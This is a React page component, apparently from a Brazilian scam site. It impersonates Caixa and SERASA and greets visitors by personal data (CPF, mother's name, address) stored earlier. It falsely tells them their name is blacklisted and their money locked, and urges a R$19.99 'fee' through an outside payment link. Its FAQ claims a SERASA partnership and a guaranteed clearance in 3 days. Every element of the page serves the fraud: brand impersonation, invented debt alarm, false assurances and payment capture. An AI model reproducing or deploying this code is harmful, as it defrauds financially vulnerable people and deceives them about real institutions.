import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import { HiChevronRight } from "react-icons/hi";
import { IoIosWarning } from "react-icons/io";
import pix from "../assets/pix.png"
import { Helmet } from "react-helmet";

export function Upsell() {

    const [userData, setUserData] = useState({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    const questions = [
        {
            question: "Por que oferecer um desconto de 90%?",
            answer: "Queremos proporcionar uma oportunidade única para que você resolva suas pendências financeiras de forma acessível. Nosso objetivo é facilitar sua vida financeira e permitir que você tenha controle sobre seu nome."
        },
        {
            question: "Como garantir que meu nome será limpo?",
            answer: "Nosso processo é 100% seguro e feito em parceria com a SERASA. Após a confirmação do pagamento, sua situação será regularizada no sistema."
        },
        {
            question: "Quais são as formas de pagamento?",
            answer: "Você pode optar por PIX, cartões de crédito e débito para realizar o pagamento. Basta escolher a forma que mais facilita seu acesso."
        },
        {
            question: "Quanto tempo leva para regularizar meu nome?",
            answer: "Após o pagamento, seu nome será limpo em até 3 dias úteis. Garantimos um processo rápido e seguro para sua tranquilidade."
        }
    ];

    return (
        <div className="flex flex-col items-center w-full min-h-screen bg-white text-gray-800  pb-10">
            {/* Cabeçalho */}
            <header className="flex items-center justify-between w-full py-4 bg-blue-800 text-white px-6">
                <div className="flex items-center space-x-3">
                    <img width={34} src={logo} alt="Logo" />
                    <span>Olá, {userData.nome.split(" ")[0]}</span>
                </div>
            </header>

            {/* Container de Conteúdo */}
            <div className="flex flex-col items-center w-full max-w-md bg-white shadow-lg rounded-lg p-4">
                <div className="text-center">
                    {/* <img src={discountBadge} alt="90% Desconto" className="w-16 mx-auto" /> */}

                    <div className="flex items-center justify-center space-y-4">
                        <IoIosWarning className="text-red-500 mr-2" size={36} />
                        <h2 className="text-3xl font-bold text-red-500">ATENÇÃO!</h2>
                    </div>

                    <h2 className="text-3xl font-bold text-zinc-800 mt-4 mb-3">
                        SEU NOME ESTÁ SUJO NO SERASA
                    </h2>

                    <div className="w-full  py-4">
                        <div dangerouslySetInnerHTML={{ __html: '<div id="vid_672d05d660ed65000ad52cb8" style="position:relative;width:100%;padding: 56.25% 0 0;"> <img id="thumb_672d05d660ed65000ad52cb8" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/672d05d660ed65000ad52cb8/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_672d05d660ed65000ad52cb8" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div>' }} />
                        <Helmet>
                            <script type="text/javascript" id="scr_672d05d660ed65000ad52cb8"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/672d05d660ed65000ad52cb8/player.js", s.async=!0,document.head.appendChild(s); </script>
                        </Helmet>
                    </div>

                    <h2 className="text-xl text-center text-red-600">O dinheiro permanecerá travado enquanto não regularizar seu nome no <span className="font-bold">SERASA</span> </h2>


                    <p className="text-gray-500 mt-4 text-2xl">
                        Para regularizar todas as suas dívidas e limpar o seu nome, pague a taxa única com desconto!
                    </p>

                    <button className="text-gray-500 text-lg mt-2">
                        <span className="text-2xl"> DESCONTO DE <span className="font-bold text-red-500">98%</span></span> <br />
                        <span className="text-green-600 font-bold text-4xl">R$ 19,99</span> apenas
                    </button>

                </div>

                <div className="mt-6">
                    <img src={pix} width={100} alt="xxx" />
                </div>

                <div className="mt-6">
                    <a href="https://pay.pagamentofgt.shop/lDW0ZaO2MXdgN7E" className="w-full">
                        <button className="bg-orange-500 w-full py-3 rounded-md text-white text-xl font-bold hover:bg-orange-600 focus:outline-none">
                            PAGAR TAXA E LIMPAR MEU NOME
                        </button>
                    </a>
                </div>
                {/* 
                <button className="text-gray-500 text-lg mt-2">
                    DESCONTO DE <span className="">97%</span> <br />
                    <span className="text-green-600 font-bold text-4xl">R$ 9,90</span> apenas
                </button>


                <div className="mt-6">
                    <img src={pixIcon} alt="Pagamentos por Pix" className="w-20 mx-auto" />
                </div>

                <div className="mt-6">
                    <a href="https://pay.pagamentofgt.shop/VroegNqEmKPGKwj" className="w-full">
                        <button className="bg-orange-500 w-full py-3 rounded-md text-white text-xl font-bold hover:bg-orange-600 focus:outline-none">
                            Pagar no CRÉDITO e Limpar Nome
                        </button>
                    </a>
                </div> */}



                <p className="text-gray-500 text-sm text-center mt-4">
                    Oferta por tempo limitado! Aproveite a condição especial e regularize sua situação financeira.
                </p>

                {/* FAQ Section */}
                <div className="w-full mt-10">
                    <h3 className="text-lg font-semibold text-gray-700 mb-4 bg-white">Perguntas Frequentes</h3>
                    {questions.map((item, index) => (
                        <div key={index} className="border-b pb-4 mb-4">
                            <button
                                className="flex justify-between w-full text-left py-2 text-gray-700 hover:text-gray-900 focus:outline-none"
                            >
                                <h5 className="font-semibold">{item.question}</h5>
                                <HiChevronRight size={24} />
                            </button>
                            <p className="text-gray-500 mt-2 px-2">{item.answer}</p>
                        </div>
                    ))}
                </div>
            </div>
        </div>
    );
}